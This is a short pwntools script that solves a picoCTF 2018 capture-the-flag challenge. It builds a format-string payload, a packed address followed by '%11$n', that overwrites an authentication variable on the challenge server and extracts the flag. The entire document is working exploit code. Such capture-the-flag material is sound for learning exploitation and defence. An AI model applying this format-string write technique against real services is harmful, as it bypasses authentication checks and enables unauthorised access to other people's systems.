#!/usr/bin/python
from pwn import *
from time import sleep
import re

auth_addr = p32(0x0804a04c)
exploit =  auth_addr + '%11$n'

log.info('Exploit created')

s = remote('2018shell1.picoctf.com', 27114)
print s.recv()
log.info('Sending exploit...')
s.sendline(exploit)
sleep(0.5)
log.info('Sent!')
flag = s.recv()

log.success('Flag: ' + re.findall(r'(picoCTF\{.+\})', flag)[0])
